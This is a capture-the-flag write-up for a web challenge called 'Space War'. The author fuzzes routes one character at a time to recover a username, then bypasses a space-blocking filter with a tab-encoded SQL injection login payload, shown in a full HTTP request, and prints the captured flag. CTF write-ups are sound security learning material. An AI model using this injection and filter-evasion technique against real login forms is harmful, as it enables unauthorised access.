### Space War

Description: i started war as i don't like EQUALity, i lost, they cut every LETTER of my name and sent them to different ROUTES. Wanna know my name in L33t???

Using spaces, single quotes in the username field are triggering the firewall, it says `Ummmm, TBH, i love " but hate whitespaces`.

After a long time it struck me that the description is pointing to directory fuzzing, starting with only one alpabet or number, i made a wordlist of all alphabets(UPPERCASE and lowercase) and numbers (0-9). Fuzzing using this list gives 200 for only 1 charecter. Then you prepend the 20 OK charecter to all chars in your original list and continue it till you dont see any 200.

/K -> /Ku -> /Kur -> /Kur0 -> /Kur0s -> /Kur0s4 -> /Kur0s4k -> /Kur0s4k1

Doing the above, we get that the username is `Kur0s4k1`, the response to `/Kur0s4k1` is: -
```
Ohhhh myy Goddd!! you finally did it!! you are worthy, my name Kur0s4k1
```

The using `Kur0s4k1"%09OR%091;--%09-` as the user to bypass waf, will let us in. There are many ways in which we can bypass spaces, replace them with `/**/` or `[TAB]`(what I did here) etc.
```
POST /login HTTP/1.1
Host: 34.132.132.69:8005
User-Agent: useragent
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://34.132.132.69:8005
DNT: 1
Sec-GPC: 1
Connection: close
Referer: http://34.132.132.69:8005/
Upgrade-Insecure-Requests: 1

username=Kur0s4k1"%09OR%091=1;--%09-&password=lol
```

You will be redirected to /dashboard after login
```
SO YOU FOUND IT
you are worthy to see my SECRET...

flag{1_kn0w_y0u_will_c0me_b4ck_S0M3DAY_0dsf513sg445s}
```

### FLag

`flag{1_kn0w_y0u_will_c0me_b4ck_S0M3DAY_0dsf513sg445s}`
